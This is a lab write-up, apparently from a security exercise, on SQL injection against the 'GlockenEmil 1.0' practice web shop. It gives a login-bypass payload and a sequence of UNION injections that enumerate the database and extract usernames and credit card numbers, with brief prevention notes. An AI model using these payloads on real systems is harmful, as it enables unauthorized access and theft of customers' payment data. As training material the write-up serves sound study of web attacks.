# GlockenEmil 1.0 - SQL Injection Attack

- watched Request and Response of the login page for arbitrary logins via Burp Proxy
- we assume that the login query would look something like this:

```sql
SELECT 1 FROM user WHERE username='___' AND password='___';
```

- we tried the `'OR ''=''` separately/together in the username and password field to exploit a known vulnerability
- if we use that in the password field we can successfully login without the correct password
- the credit card number of `hacker10` is `1323-4545-6767-8989`
- to prevent this attack a proper input validation and sanitizing is needed

# GlockenEmil 1.0 – SQL Injection with UNION

- searched for `Muotathaler Treichel` just to see what we get as a result
- we get information about the product with 5 columns
- the 5 columns are `productid`, `name`, `description`, `price`, `picture`
- we tried the usual SQL Injection just to check if we can do anything by adding `'OR 1=1--` but we got the error that we're in `boolean mode`
- also we noticed the `parenthesis`

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'OR 1=1-- ' in boolean mode)' at line 1
```

- based on that we tried to modify our injection to `') OR 1=1#`
- by doing so we could get a valid response. We first parenthesized our injection and also added `#` to comment out everything after our command
- also we prevent the boolean mode
- after that we tried to get general DB and table infos

```sql
') UNION SELECT 1,schema_name,3,4,5 FROM INFORMATION_SCHEMA.SCHEMATA#
```

```sql
') UNION SELECT 1,table_name,3,4,5 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'glocken_emil'#
```

```sql
') UNION SELECT 1,column_name,3,4,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'customers'#
```

```sql
') UNION SELECT 1,username,creditcard,4,5 FROM customers#
```

- with the last injection we found out the credit card number of the user `hacker42`

```text
hacker42 -> 2323-4545-2354-8989
```

- to prevent this attack a proper input validation and sanitizing is needed
